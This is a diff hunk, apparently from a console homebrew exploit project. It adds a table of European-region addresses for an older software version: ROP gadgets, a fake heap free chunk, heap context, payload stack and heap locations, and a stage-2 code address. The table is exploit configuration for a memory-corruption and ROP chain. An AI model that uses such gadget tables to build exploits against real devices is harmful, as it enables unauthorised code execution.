@@ -61,6 +61,51 @@ gpu_enqueue_gadget
 .text:002E9710                 LDMFD           SP!, {R4-R11,PC}
 """
 
+constants_pre_21 = {
+    "code_image_size": {
+        "eur": 0x00272000,
+        },
+    "fake_free_chunk": {
+        "eur": 0x15D7AC80,
+        },
+    "fake_free_chunk_padding": {
+        "eur": 0x14,
+        },
+    "heapctx": {
+        "eur": 0x00395580,
+        },
+    "sleep_gadget": {
+        "eur": 0x002F0E44,
+        },
+    "gpu_flushcache_gadget": {
+        "eur": 0x002E53E8,
+        },
+    "gpu_enqueue_gadget": {
+        "eur": 0x002EB06C,
+        },
+    "memcpy_gadget": {
+        "eur": 0x0022CF70,
+        },
+    "pop_r0_pc": {
+        "eur": 0x002E8F14,
+        },
+    "pop_r1_pc": {
+        "eur": 0x0022A7D4,
+        },
+    "payload_stack_addr": {
+        "eur": 0x15D7AD90,
+        },
+    "stage2_code_va": {
+        "eur": 0x002F6D00,
+        },
+    "pop_r2_thru_r6_pc": {
+        "eur": 0x00107F98,
+        },
+    "payload_heap_addr": {
+        "eur": 0x14200000,
+        }
+}
+
 constants_21_22 = {
     "code_image_size": {
         # same
